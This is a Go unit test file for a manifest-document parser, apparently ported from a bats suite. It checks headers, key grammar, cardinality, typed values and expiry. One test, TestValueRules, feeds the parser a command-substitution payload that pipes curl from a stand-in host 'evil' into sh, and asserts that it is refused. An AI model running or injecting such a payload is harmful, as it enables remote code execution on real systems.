package docfmt

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// Inventory — tests/unit/doc.bats:
// PORTED: tests/unit/doc.bats: "a well-formed document scans to records, repeats preserved in order" -> TestParseWellFormed
// PORTED: tests/unit/doc.bats: "the header is mandatory and its type must match" -> TestHeaderGate
// PORTED: tests/unit/doc.bats: "an unknown format version in the header is refused, naming it" -> TestHeaderGate
// PORTED: tests/unit/doc.bats: "a command substitution never executes and is refused" -> TestValueRules
// PORTED: tests/unit/doc.bats: "control bytes are refused, and the fixtures really contain them" -> TestByteGate
// PORTED: tests/unit/doc.bats: "an unreadable document is reported as unreadable, not as containing control bytes" -> TestSnapshotUnreadable
// PORTED: tests/unit/doc.bats: "keys are lowercase with an optional single dotted prefix" -> TestKeyGrammar
// PORTED: tests/unit/doc.bats: "a line with no = is refused rather than skipped" -> TestParseRefusals
// PORTED: tests/unit/doc.bats: "a file without a trailing newline is refused as truncated" -> TestParseRefusals
// PORTED: tests/unit/doc.bats: "comments and blank lines are ignored" -> TestParseWellFormed
// PORTED: tests/unit/doc.bats: "the key-count cap is exact: 1024 keys accepted, 1025 refused, and names the cap" -> TestKeyCountCap
// PORTED: tests/unit/doc.bats: "a missing file reports rc 3" -> TestSnapshotUnreadable
// PORTED: tests/unit/doc.bats: "a 'one' key appearing twice is rejected" -> TestCardinality
// PORTED: tests/unit/doc.bats: "a missing 'one' key is rejected, naming it" -> TestCardinality
// PORTED: tests/unit/doc.bats: "an 'opt' key may appear zero or one times, never twice" -> TestCardinality
// PORTED: tests/unit/doc.bats: "a 'many' key may appear zero, one or several times" -> TestCardinality
// PORTED: tests/unit/doc.bats: "an unknown key is REJECTED, not ignored" -> TestParseRefusals
// PORTED: tests/unit/doc.bats: "mi_doc_load's diagnostics report the label, not the raw file path" -> TestDiagnosticsUseLabel
// PORTED: tests/unit/doc.bats: "a spec with the cardinality omitted is refused, not read as 'optional'" -> TestSchemaSelfCheck -- the Go schema cannot omit Card syntactically — the zero value is One, the SAFE direction; what the row guards, a required key silently becoming optional, is structurally impossible, and the self-check pins the other spec bugs
// N/A: tests/unit/doc.bats: "a spec written with spaces instead of TABs is refused, not read as unknown keys" -- the Go schema is a typed map, not TAB-framed text; there is no framing to get wrong
// N/A: tests/unit/doc.bats: "a duplicate key in the spec is refused rather than resolving to the first" -- a Go map cannot hold a duplicate key
// PORTED: tests/unit/doc.bats: "rolemount requires a role and an absolute path" -> TestDocTypes
// PORTED: tests/unit/doc.bats: "docver and epoch are non-negative bounded digits" -> TestDocTypes
// PORTED: tests/unit/doc.bats: "digestref requires <repository>@sha256:<64 hex>, exactly one @" -> TestDocTypes
// PORTED: tests/unit/doc.bats: "digestref's repository component is constrained: lowercase, digits, . _ - / : only" -> TestDocTypes
// PORTED: tests/unit/doc.bats: "digestref's repository component rejects empty segments: //, ::, and : adjacent to /" -> TestDocTypes
// PORTED: tests/unit/doc.bats: "productdigest requires <product>:<64 hex>, exactly one colon" -> TestDocTypes
// PORTED: tests/unit/doc.bats: "coreversion is MAJOR[.MINOR[.PATCH]], bounded numeric components" -> TestDocTypes
// PORTED: tests/unit/doc.bats: "mi_doc_value returns the first value; mi_doc_values returns all" -> TestAccessors
// PORTED: tests/unit/doc.bats: "mi_doc_version returns the document version" -> TestAccessors
// PORTED: tests/unit/doc.bats: "expiry compares against a supplied clock" -> TestExpiry
// PORTED: tests/unit/doc.bats: "a document with no expiry never expires" -> TestExpiry
// N/A: tests/unit/doc.bats: "the public functions refuse bad arity instead of aborting under set -u" -- compile-time arity

func testSchema() Schema {
	return Schema{
		Type: "manifest",
		Fixed: map[string]KeySpec{
			"version": Typed(One, "docver"),
			"name":    Typed(One, "ident"),
			"note":    Typed(Opt, "str:64"),
			"role":    Typed(Many, "ident"),
			"expires": Typed(Opt, "epoch"),
		},
	}
}

func body(lines ...string) []byte {
	return []byte("mythical-manifest 1\n" + strings.Join(lines, "\n") + "\n")
}

func TestParseWellFormed(t *testing.T) {
	d, err := Parse(body("# comment", "", "version=1", "name=brokkr", "role=data", "role=logs"), "t", testSchema())
	if err != nil {
		t.Fatal(err)
	}
	if got := d.Values("role"); len(got) != 2 || got[0] != "data" || got[1] != "logs" {
		t.Fatalf("repeats not preserved in order: %v", got)
	}
}

func TestHeaderGate(t *testing.T) {
	// Wrong type.
	if _, err := Parse([]byte("mythical-index 1\nversion=1\nname=b\n"), "t", testSchema()); err == nil ||
		!strings.Contains(err.Error(), "not a mythical-manifest document") {
		t.Fatalf("wrong-type header: %v", err)
	}
	// Right type, unknown version — refused NAMING it.
	if _, err := Parse([]byte("mythical-manifest 9\nversion=1\nname=b\n"), "t", testSchema()); err == nil ||
		!strings.Contains(err.Error(), `"9"`) {
		t.Fatalf("unknown version not named: %v", err)
	}
}

func TestValueRules(t *testing.T) {
	for _, v := range []string{"note=$(curl evil|sh)", "note=`id`", "note=a\\b"} {
		if _, err := Parse(body("version=1", "name=b", v), "t", testSchema()); err == nil {
			t.Fatalf("%q accepted", v)
		}
	}
}

func TestByteGate(t *testing.T) {
	// The fixture REALLY contains the byte — asserted, not assumed (the bats row's own point).
	fixture := append(body("version=1", "name=b"), 0x00)
	found := false
	for _, b := range fixture {
		if b == 0x00 {
			found = true
		}
	}
	if !found {
		t.Fatal("fixture does not contain its NUL")
	}
	if _, err := Parse(fixture, "t", testSchema()); err == nil || !strings.Contains(err.Error(), "control bytes") {
		t.Fatalf("NUL: %v", err)
	}
}

func TestSnapshotUnreadable(t *testing.T) {
	_, err := Snapshot(filepath.Join(t.TempDir(), "absent"))
	if !errors.Is(err, ErrMissingDoc) {
		t.Fatalf("missing: %v", err)
	}
	dir := t.TempDir()
	p := filepath.Join(dir, "doc")
	if err := os.WriteFile(p, []byte("x\n"), 0o000); err != nil {
		t.Fatal(err)
	}
	if os.Getuid() == 0 {
		t.Skip("root reads through 0000")
	}
	_, err = Snapshot(p)
	if err == nil || errors.Is(err, ErrMissingDoc) || strings.Contains(err.Error(), "control bytes") {
		t.Fatalf("unreadable must be its own report: %v", err)
	}
}

func TestKeyGrammar(t *testing.T) {
	ok := []string{"version", "permitted_role", "brokkr.permitted_role", "a2.b_3"}
	for _, k := range ok {
		if !KeyOK(k) {
			t.Errorf("KeyOK(%q) = false", k)
		}
	}
	bad := []string{"", "Version", "a.b.c", ".x", "x.", "2abc", "brokkr.2x", "UPPER.low", strings.Repeat("a", 129)}
	for _, k := range bad {
		if KeyOK(k) {
			t.Errorf("KeyOK(%q) = true", k)
		}
	}
}

func TestParseRefusals(t *testing.T) {
	cases := map[string][]byte{
		"no assignment":     body("version=1", "name=b", "not an assignment"),
		"unknown key":       body("version=1", "name=b", "surprise=x"),
		"unterminated file": []byte("mythical-manifest 1\nversion=1\nname=b"),
	}
	for name, data := range cases {
		if _, err := Parse(data, "t", testSchema()); err == nil {
			t.Errorf("%s accepted", name)
		}
	}
}

func TestKeyCountCap(t *testing.T) {
	lines := []string{"version=1", "name=b"}
	for i := 0; i < MaxKeys-2; i++ {
		lines = append(lines, "role=r"+string(rune('a'+i%26)))
	}
	if _, err := Parse(body(lines...), "t", testSchema()); err != nil {
		t.Fatalf("exactly %d keys refused: %v", MaxKeys, err)
	}
	lines = append(lines, "role=onemore")
	_, err := Parse(body(lines...), "t", testSchema())
	if err == nil || !strings.Contains(err.Error(), "1024") {
		t.Fatalf("%d keys: %v", MaxKeys+1, err)
	}
}

func TestCardinality(t *testing.T) {
	// one twice.
	if _, err := Parse(body("version=1", "version=2", "name=b"), "t", testSchema()); err == nil {
		t.Fatal("'one' twice accepted")
	}
	// one missing, NAMED.
	_, err := Parse(body("name=b"), "t", testSchema())
	if err == nil || !strings.Contains(err.Error(), "version") {
		t.Fatalf("missing 'one' not named: %v", err)
	}
	// opt zero or once, never twice.
	if _, err := Parse(body("version=1", "name=b", "note=x"), "t", testSchema()); err != nil {
		t.Fatal(err)
	}
	if _, err := Parse(body("version=1", "name=b", "note=x", "note=y"), "t", testSchema()); err == nil {
		t.Fatal("'opt' twice accepted")
	}
	// many: zero, one, several.
	for _, extra := range [][]string{{}, {"role=a"}, {"role=a", "role=b", "role=c"}} {
		if _, err := Parse(body(append([]string{"version=1", "name=b"}, extra...)...), "t", testSchema()); err != nil {
			t.Fatalf("many x%d: %v", len(extra), err)
		}
	}
}

func TestDiagnosticsUseLabel(t *testing.T) {
	_, err := Parse(body("version=1", "name=b", "surprise=x"), "the-operator-label", testSchema())
	if err == nil || !strings.Contains(err.Error(), "the-operator-label") {
		t.Fatalf("label absent from diagnostic: %v", err)
	}
}

func TestSchemaSelfCheck(t *testing.T) {
	// A schema bug is an INTERNAL error, never a document error: nil validate, illegal key,
	// empty schema, dynamic-required all refuse before any document is judged.
	bads := []Schema{
		{Type: "manifest"},
		{Type: "", Fixed: map[string]KeySpec{"version": Typed(One, "docver")}},
		{Type: "manifest", Fixed: map[string]KeySpec{"Version": Typed(One, "docver")}},
		{Type: "manifest", Fixed: map[string]KeySpec{"version": {Card: One}}},
	}
	for i, s := range bads {
		if _, err := Parse(body("version=1"), "t", s); err == nil || !strings.Contains(err.Error(), "internal error") {
			t.Errorf("bad schema %d: %v", i, err)
		}
	}
	// Dynamic may not resolve a required key.
	dyn := Schema{Type: "manifest",
		Fixed:   map[string]KeySpec{"version": Typed(One, "docver")},
		Dynamic: func(string) (KeySpec, bool) { return Typed(One, "ident"), true }}
	if _, err := Parse(body("version=1", "extra=x"), "t", dyn); err == nil || !strings.Contains(err.Error(), "internal error") {
		t.Fatalf("dynamic-required: %v", err)
	}
}

func TestDocTypes(t *testing.T) {
	hex64 := strings.Repeat("ab", 32)
	cases := []struct {
		typ, v string
		want   bool
	}{
		{"docver", "0", true}, {"docver", "12", true}, {"docver", "", false},
		{"docver", "-1", false}, {"docver", strings.Repeat("9", 19), false},
		{"epoch", "1756000000", true}, {"epoch", "x", false},
		{"ident", "brokkr", true}, {"ident", "a-2", true}, {"ident", "2a", false}, {"ident", "A", false},
		{"sha256", hex64, true}, {"sha256", hex64[:63], false}, {"sha256", strings.ToUpper(hex64), false},
		{"digestref", "ghcr.io/x/brokkr@sha256:" + hex64, true},
		{"digestref", "reg:5000/x@sha256:" + hex64, true},
		{"digestref", "x@sha256:" + hex64[:10], false},
		{"digestref", "x:latest", false},                     // a tag is not a digest
		{"digestref", "a@b@sha256:" + hex64, false},          // exactly one @
		{"digestref", "UPPER/x@sha256:" + hex64, false},      // charset
		{"digestref", "a//b@sha256:" + hex64, false},         // empty segment
		{"digestref", "repo::5000/x@sha256:" + hex64, false}, // empty host segment
		{"digestref", "a:/b@sha256:" + hex64, false},         // empty port
		{"digestref", "/x@sha256:" + hex64, false},           // leading separator
		{"productdigest", "brokkr:" + hex64, true},
		{"productdigest", "brokkr:" + hex64 + ":x", false}, // exactly one colon
		{"productdigest", "Brokkr:" + hex64, false},
		{"coreversion", "1", true}, {"coreversion", "1.2", true}, {"coreversion", "1.2.3", true},
		{"coreversion", "1.2.3.4", false}, {"coreversion", "1..2", false}, {"coreversion", "v1", false},
		{"rolemount", "data:/srv/x", true},
		{"rolemount", "data:relative", false},
		{"rolemount", "data:/a/../b", false},
		{"rolemount", "2x:/srv", false},
		{"rolemount", "data:/a:b", false},                  // exactly one colon
		{"str:4", "abcd", true}, {"str:4", "abcde", false}, // delegation to the config engine
	}
	for _, c := range cases {
		if got := TypeOK(c.typ, c.v); got != c.want {
			t.Errorf("TypeOK(%q, %q) = %v, want %v", c.typ, c.v, got, c.want)
		}
	}
}

func TestAccessors(t *testing.T) {
	d, err := Parse(body("version=3", "name=b", "role=a", "role=c"), "t", testSchema())
	if err != nil {
		t.Fatal(err)
	}
	if v, ok := d.Value("role"); !ok || v != "a" {
		t.Fatalf("first value: %q", v)
	}
	if all := d.Values("role"); len(all) != 2 {
		t.Fatalf("all values: %v", all)
	}
	if v, ok := d.Version(); !ok || v != "3" {
		t.Fatalf("version: %q", v)
	}
}

func TestExpiry(t *testing.T) {
	d, err := Parse(body("version=1", "name=b", "expires=1000"), "t", testSchema())
	if err != nil {
		t.Fatal(err)
	}
	// Inclusive: valid AT the stated instant, invalid one past it.
	if got, err := d.Expired(1000); err != nil || got {
		t.Fatalf("at T: %v %v", got, err)
	}
	if got, err := d.Expired(1001); err != nil || !got {
		t.Fatalf("past T: %v %v", got, err)
	}
	if got, err := d.Expired(999); err != nil || got {
		t.Fatalf("before T: %v %v", got, err)
	}
	// No expiry never expires.
	d2, _ := Parse(body("version=1", "name=b"), "t", testSchema())
	if got, err := d2.Expired(1 << 40); err != nil || got {
		t.Fatalf("no-expiry: %v %v", got, err)
	}
}
